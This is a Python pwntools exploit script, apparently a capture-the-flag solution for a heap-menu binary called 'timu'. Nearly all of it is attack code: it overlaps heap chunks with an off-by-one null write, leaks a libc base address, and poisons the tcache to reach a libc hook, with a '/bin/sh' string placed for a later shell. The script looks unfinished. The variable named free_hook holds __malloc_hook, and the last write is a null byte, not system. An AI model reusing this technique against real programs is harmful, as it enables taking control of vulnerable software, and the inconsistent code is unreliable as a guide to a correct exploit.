from pwn import *

remote_addr = '111.111.111.111'
remote_port = 23333
local_addr = '127.0.0.1'
local_port = 23333


uselibc = 2
local = 1
haslibc = 1
atta = 1
useld = 0


context.update(terminal=["tmux","splitw","-h"],
        os = "linux",
        log_level = "debug",
        endian = "little")

if uselibc == 2:
    context.update(arch="amd64")
else:
    context.update(arch="i386")

if haslibc == 0:
    if uselibc == 2:
        libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    else:
        libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
else:
    libc = ELF("./libc.so.6")

if useld == 0:
    pc = ['./timu']
else:
    pc = ['./ld.so','./timu']

if local == 1:
    if haslibc:
        p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    else:
        p = process(pc)
elif local == 0:
    p = remote(remote_addr,remote_port)
elif local == 2:
    p = remote(local_addr,local_port)

if local:
    if atta:
        gdb.attach(p,'b *0x555555554000+0xabd\n b *0x555555554000+0xb9f')

def sla(a,b):
    p.sendlineafter(a,b)

def sl(a):
    p.sendline(a)

def sn(a):
    p.send(a)

def rv(a):
    return p.recv(a)

def rl():
    return p.recvline()

def sla(a,b):
    p.sendlineafter(a,b)

def sa(a,b):
    p.sendafter(a,b)

def ru(a):
    return p.recvuntil(a)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def create(size,content):
    sla('choice :\n','1')
    sla('Size: \n',str(size))
    sa('Data: \n',content)

def delete(idx):
    sla('choice :\n','2')
    sla('Index: \n',str(idx))

def show():
    sla('choice :\n','3')

def hack():
    raw_input()
    create(0x88,'a'+'\n')   #0
    create(0x520,(p64(0x500) + p64(0x20))*0x52)   #1
    create(0x410,'a'+'\n')  #2
    create(0x20,'/bin/sh\0'+'\n')   #3

    delete(0)
    delete(1)
    create(0x88,'a'*0x88)   #0
    create(0x410,'a'+'\n')  #1
    create(0xd0,'a' + '\n')    #4
    
    delete(1)
    delete(2)

    create(0x410,'a'+'\n')  #1
    show()
    ru('4 : ')
    libc.address = u64(rv(6).ljust(8,'\x00')) - 0x3ebca0
    lg('libc',libc.address)
    system = libc.symbols['system']
    lg('system',system)
    free_hook = libc.symbols['__malloc_hook']
    lg('free_hook',free_hook)

    create(0xd0,'a'+'\n')   #2
    create(0xd0,'a'+'\n')   #5
    delete(5)
    delete(2)
    delete(4)
    create(0xd0,p64(free_hook)+'\n') #2
    create(0xd0,'a'+'\n')   #4
    create(0xd0,'\x00'+'\n')    #5

    #delete(3)

hack()
